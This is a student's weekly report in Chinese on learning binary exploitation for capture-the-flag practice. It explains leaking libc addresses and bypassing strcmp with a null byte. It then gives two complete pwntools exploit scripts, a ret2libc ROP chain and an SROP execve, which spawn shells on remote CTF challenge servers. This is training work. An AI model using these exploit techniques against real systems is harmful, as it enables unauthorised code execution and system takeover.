## 个人周报 
景禹淇 202012567

**本周工作：**  
1. 搭建个人博客
2. 掌握srop技术
3. 掌握栈迁移技术
4. buuctf刷题 
  
**本周遇到的技术困难及解决方案：**  
1. 当栈溢出后利用rop（64位）泄露函数got表中地址时，如果此时原函数还有输出，用通常的方法leak函数地址的payload：
   ```python
   xxx_addr=u64(p.recv(6).ljust(8,'\x00'))
   ```
   不能直接找到函数的地址。 

   **解决方案：**
   由于leak出的函数地址前还有输出(假设有3f个字节)，可以通过gdb手动找到函数位置：
   ```python
    xxx_addr=u64(p.recv(0x3f+0x6)[-6:].ljust(8,'\x00'))
   ```
   这种方法效率较低，还容易出错。因为leak出的地址以'\x7f'开头，所以可以构造payload如下：
   ```python 
    xxx_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
   ```
2. 当你要输入大量字符来造成溢出，而strcmp函数却对字符串有着要求：
   ```c++
   strcmp(&s, "neuqacm")
   ``` 
   **解决方案：**
   查阅资料了解，strcmp函数将两个字符串自左向右逐个字符相比（按ASCII值大小相比较），直到出现不同的字符或遇'\x00'为止。所以可以构造payload如下：
   ```python
   pay='neuqacm\x00'+'aaaaaaaaaaaaa'
   ```
##### 下周安排：

1. 复盘月赛
2. 学习heap相关知识
3. buuctf刷题 
   
##### 成果展示：
>就贴几个写的比较久的exp吧
1. <font size=5>`rop.exp`</font>
```python
from pwn import *
from LibcSearcher import *

context.os='linux' 
context.arch='amd64' 
context.log_level='debug' 

p=remote('node3.buuoj.cn',28304)
#p = process('./1')
elf = ELF('./1')
printf_plt = elf.plt['printf']
read_got = elf.got['read']
main = elf.sym['main']
sys=0x045390

leave_ret = 0x04006ca
pop_rdi =0x0400733
pop_rsi_r15=0x00400731 
bss=0x0804A300
sh=0x18cd57
read_addr=0x0f7250

p.recvuntil('name? ')
pay="A"*0x28 + p64(pop_rdi) + p64(read_got)+p64(printf_plt)+p64(main)
p.sendline(pay)

read=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
#read=u64(p.recv(0x3e+0x6)[-6:].ljust(8,'\x00'))
print(hex(read))

base=read-read_addr
sh+=base
sys+=base

p.recvuntil('name? ')
pay="A"*0x28 + p64(pop_rdi) +p64(sh)+p64(sys)
p.sendline(pay)
p.interactive() 
```
2. <font size=5>`srop.exp`</font>
```python
from pwn import *
from LibcSearcher import *

context.os='linux' 
context.arch='amd64' 
context.log_level='debug' 

p=remote('nnode3.buuoj.cn',29784)
#p = process('./1')
elf = ELF('./1')
main=0x0040051D
sigret=0x04004DA
sys=0x00400501
#gdb.attach(p,"b *0x040051d")

pay='/bin/sh\x00'+"A"*8+p64(0x4004F1)
p.send(pay)
p.recv(0x20)
#sh=u64(p.recv(8))-0x5438+0x5320
sh=u64(p.recv(8))-0x118
print(hex(sh))


frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = sh
frame.rsi = 0
frame.rdx = 0
frame.rip = sys

pay="a"*16+p64(sigret)+p64(sys)+str(frame)
p.send(pay)
p.interactive()
```
